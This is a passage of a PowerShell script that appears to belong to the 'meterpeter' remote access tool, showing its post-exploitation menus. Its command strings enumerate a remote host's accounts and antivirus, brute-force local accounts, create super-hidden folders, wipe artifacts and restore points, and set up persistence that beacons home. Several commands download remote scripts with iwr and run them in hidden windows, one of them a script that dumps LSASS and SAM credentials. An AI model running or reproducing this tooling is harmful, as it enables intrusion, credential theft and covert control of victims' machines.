...
.SYNOPSIS
   ...
   PS Script Dev Version: v2.10.10.13
  ...
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "AdvInfo" -or $Command -ieq "adv")
    {
      ...
      If($choise -ieq "FRM" -or $choise -ieq "FRManager")
      {
         ...
         {
            Write-Host " List Remote-Host active firewall rules." -ForeGroundColor Blue -BackgroundColor White
         ...
         {
            Write-Host " Create new 'Block' firewall rule." -ForeGroundColor Blue -BackgroundColor White
         ...
         {
            Write-Host " Delete existing Block\Allow firewall rule." -ForeGroundColor Blue -BackgroundColor White
            Write-Host " => Remark: Dont use double quotes in inputs!" -ForegroundColor Yellow
      ...
      If($choise -ieq "ListAcc" -or $choise -ieq "acc")
      {
         ...
         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Disabled,Name,PasswordRequired,PasswordChangeable,SID|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt;If(-not(`$Out)){echo `"   [i] error: cmdlet cant retrive remotehost accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force";
      }
      ...
      {
        write-host " List Installed AV ProductName." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;Write-Host ""
      ...
      {
        write-host " List Remote-Host StartUp Entrys (regedit)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;
      ...
      If($choise -ieq "ListConn" -or $choise -ieq "conn")
      {
         ...
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Conn> " -NoNewline -ForeGroundColor Green;
         $ConManager_choise = Read-Host;
         If($ConManager_choise -ieq "Query")
         {
            write-host " Enumerating remote-host Established TCP connections." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
    ...
    If($Command -ieq "PostExploit" -or $Command -ieq "post")
    {
      ...
      write-host "   MyVault   Create super hidden folders     Query\Create\Delete super hidden dirs";
      ...
      write-host "   BruteAcc  Brute-force user account        Client:User  - Privileges Required";
      ...
      $choise = Read-Host;
      If($choise -ieq "MyVault" -or $choise -ieq "vault")
      {
         write-host "`n`n   Description" -ForegroundColor Yellow
         write-host "   -----------"
         ...
         write-host "`n`n   Modules  Description                  Remark" -ForegroundColor green;
         write-host "   -------  -----------                  ------";
         write-host "   Query    for super hidden folders     Client:User  - Privileges Required";
         ...
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Vault> " -NoNewline -ForeGroundColor Green;
         $Vault_choise = Read-Host;
         If($Vault_choise -ieq "Query")
         {
            Write-Host " Query for super hidden folders" -ForegroundColor Blue -BackgroundColor White;
            Write-Host " Leave input field blank to random search for folders." -ForegroundColor Yellow
            $FolderName = Read-Host " - Folder name to search";
            $Directory = Read-Host " - The directory to scan";write-host ""
            If(-not($Directory) -or $Directory -ieq $null){$Directory = "false"}
            If(-not($FolderName) -or $FolderName -ieq $null){$FolderName = "false"}

            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/SuperHidden.ps1`" -OutFile `"`$Env:TMP\SuperHidden.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\SuperHidden.ps1 -Action Query -Directory `"$Directory`" -FolderName `"$FolderName`";Remove-Item -Path `$Env:TMP\SuperHidden.ps1 -Force"
         }
         If($Vault_choise -ieq "Create")
         {
            Write-Host " Create\Modify super hidden folders" -ForegroundColor Blue -BackgroundColor White;
            $Action = Read-Host " - Create Hidden or Visible dir";
            $FolderName = Read-Host " - Folder name to Create\Modify";
            $Directory = Read-Host " - The storage directory to use";write-host ""
            If(-not($Action) -or $Action -ieq $null){$Action = "hidden"}
            If(-not($Directory) -or $Directory -ieq $null){$Directory = "`$Env:TMP"}
            If(-not($FolderName) -or $FolderName -ieq $null){$FolderName = "SuperHidden"}
         ...
         {
            Write-Host " Delete super hidden folders" -ForegroundColor Blue -BackgroundColor White;
      ...
      If($choise -ieq "BruteAcc" -or $choise -ieq "Brute")
      {
         ...
         {
            Write-Host " Brute-Forcing User Account (dicionary attack)" -ForegroundColor Blue -BackgroundColor White;
            $UserAccountName = Read-Host " - Input Account Name";write-host ""
            ...
            $BruteTable.Columns.Add("WorkingDir")|Out-Null
            $BruteTable.Columns.Add("Dicionary")|Out-Null
            $BruteTable.Columns.Add("StartTime")|Out-Null

            #Adding values to output DataTable!
            $BruteTable.Rows.Add("$UserAccountName","`$Env:TMP\","passwords.txt","$BruteTime")|Out-Null
      ...
      If($choise -ieq "Artifacts")
      {
         ...
         If($track_choise -ieq "Paranoid") 
         {
            ...
            Write-Host " - Delete All Restore Points? (y|n): " -NoNewline
            $RPointsStatus = Read-Host;If($RPointsStatus -iMatch '^(y|yes|true)$'){$RStdout = "True"}Else{$RStdout = "False"}
            Write-Host " Please wait while module cleans artifacts." -ForegroundColor Blue -BackgroundColor White
      ...
      If($choise -ieq "Persist" -or $choise -ieq "persistance")
      {
        ...
        write-host "   Target machine needs to restart (startup) to beacon home at sellected time.";
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
      ...
      If($choise -ieq "DumpSAM" -or $choise -ieq "sam")
      {
        ...
        $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DumpLsass.ps1`" -OutFile `"`$Env:TMP\DumpLsass.ps1`"|Unblock-File;powershell -WindowStyle hidden -File `$Env:TMP\DumpLsass.ps1 -Action all;Start-Sleep -Seconds 1;Remove-Item -Path `"`$Env.TMP\DumpLsass.ps1`" -Force"
      }
